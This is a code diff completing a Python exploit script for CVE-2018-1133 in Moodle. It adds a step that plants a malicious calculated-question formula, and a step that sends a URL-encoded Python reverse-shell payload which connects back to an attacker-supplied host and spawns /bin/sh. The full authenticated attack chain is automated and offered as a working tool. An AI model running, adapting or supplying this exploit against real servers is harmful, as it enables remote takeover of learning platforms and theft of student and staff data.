@@ -22,6 +22,7 @@ class CVE2018_1133:
         self.session = requests.Session()
         self.session.headers.update(self.headers)
         self.payload = "(python+-c+'import+socket,subprocess,os%3bs%3dsocket.socket(socket.AF_INET,socket.SOCK_STREAM)%3bs.connect((\"" + self.host + "\"," + self.port + "))%3bos.dup2(s.fileno(),0)%3b+os.dup2(s.fileno(),1)%3b+os.dup2(s.fileno(),2)%3bp%3dsubprocess.call([\"/bin/sh\",\"-i\"])%3b')"
+
     # login with creds
     def login(self):
         print (LogColors.BLUE + "login with credentials..." + LogColors.ENDC)
@@ -210,7 +211,7 @@ class CVE2018_1133:
             if link[0]:
                 link = link[0]
                 self.cmid = link[link.find("?id=")+4:link.find("&amp")]
-                print (self.cmid)
+                print (LogColors.YELLOW + "Quiz ID: " + self.cmid + LogColors.ENDC)
                 print (LogColors.YELLOW + "successfully configure quiz..." + LogColors.ENDC)
         else:
             print (LogColors.RED + "failed to configure quiz. you are idiot..." + LogColors.ENDC)
@@ -240,7 +241,85 @@ class CVE2018_1133:
     # add evil
     def add_evil(self):
         print (LogColors.BLUE + "add evil..." + LogColors.ENDC)
+        data = {
+            "initialcategory" : 1,
+            "reload" : 1,
+            "shuffleanswers" : 1,
+            "answernumbering" : "abc",
+            "mform_isexpanded_id_answerhdr" : 1,
+            "noanswers" : 1,
+            "nounits" : 1,
+            "numhints" : 2,
+            "synchronize" : "",
+            "wizard" : "datasetdefinitions",
+            "id" : "",
+            "inpopup" : 0,
+            "cmid" : self.cmid,
+            "courseid" : 2,
+            "returnurl" : "/mod/quiz/edit.php?cmid={}&addonpage=0".format(self.cmid),
+            "scrollpos" : 0,
+            "appendqnumstring" : "addquestion",
+            "qtype" : "calculated",
+            "makecopy" : 0,
+            "sesskey" : self.session_key,
+            "_qf__qtype_calculated_edit_form" : 1,
+            "mform_isexpanded_id_generalheader" : 1,
+            "mform_isexpanded_id_unithandling" : 0,
+            "mform_isexpanded_id_unithdr" : 0,
+            "mform_isexpanded_id_multitriesheader" : 0,
+            "mform_isexpanded_id_tagsheader" : 0,
+            "category" : "2,23",
+            "name" : "kukukuku",
+            "questiontext[text]" : "<p>kukukuku<br></p>",
+            "questiontext[format]" : 1,
+            "questiontext[itemid]" : 999787569,
+            "defaultmark" : 1,
+            "generalfeedback[text]" : "",
+            "generalfeedback[format]" : 1,
+            "generalfeedback[itemid]" : 729029157,
+            "answer[0]" : ' /*{a*/`$_GET[0]`;//{x}}',
+            "fraction[0]" : "1.0",
+            "tolerance[0]" : "0.01",
+            "tolerancetype[0]" : 1,
+            "correctanswerlength[0]" : 2,
+            "correctanswerformat[0]" : 1,
+            "feedback[0][text]" : "",
+            "feedback[0][format]" : 1,
+            "feedback[0][itemid]" : 928615051,
+            "unitrole" : 3,
+            "penalty" : "0.3333333",
+            "hint[0]text]" : "",
+            "hint[0]format]" : 1,
+            "hint[0]itemid]" : 236679070,
+            "hint[1]text]" : "",
+            "hint[1]format]" : 1,
+            "hint[1]itemid]" : 272691514,
+            "tags" : "_qf__force_multiselect_submission",
+            "submitbutton" : "Save change"
+        }
 
+        r = self.session.post(self.url + "/question/question.php", data = data)
+        if r.ok:
+            print (LogColors.YELLOW + "evil question successfully created :)" + LogColors.ENDC)
+        else:
+            print (LogColors.RED + "failed to create evil question :(" + LogColors.ENDC)
+            sys.exit()
+
+    # send evil payload
+    def send_payload(self):
+        print (LogColors.BLUE + "send evil payload with reverse shell..." + LogColors.ENDC)
+        print (LogColors.YELLOW + self.payload + LogColors.ENDC)
+        return_url = "/mod/quiz/edit.php?cmid={}".format(self.cmid)
+        evil_url = self.url + "/question/question.php?returnurl={}".format(return_url)
+        evil_url += "&addonpage=0&appendqnumstring=addquestion&scrollpos=0&id=8&wizardnow=datasetitems"
+        evil_url += "&cmid={}&0=({})".format(self.cmid, self.payload)
+
+        r = self.session.get(evil_url, verify = False)
+        if r.ok:
+            print (LogColors.GREEN + "=^..^= good job. successssssssfully send payload. hacked. =^..^=" + LogColors.ENDC)
+        else:
+            print (LogColors.RED + "failed exploit. you are idiot :(" + LogColors.ENDC)
+            sys.exit()
 
     # exploitation logic
     def exploit(self):
@@ -252,6 +331,8 @@ class CVE2018_1133:
         self.add_quiz()
         self.configure_quiz()
         self.edit_quiz()
+        self.add_evil()
+        self.send_payload()
 
 if __name__ == '__main__':
     parser = argparse.ArgumentParser()
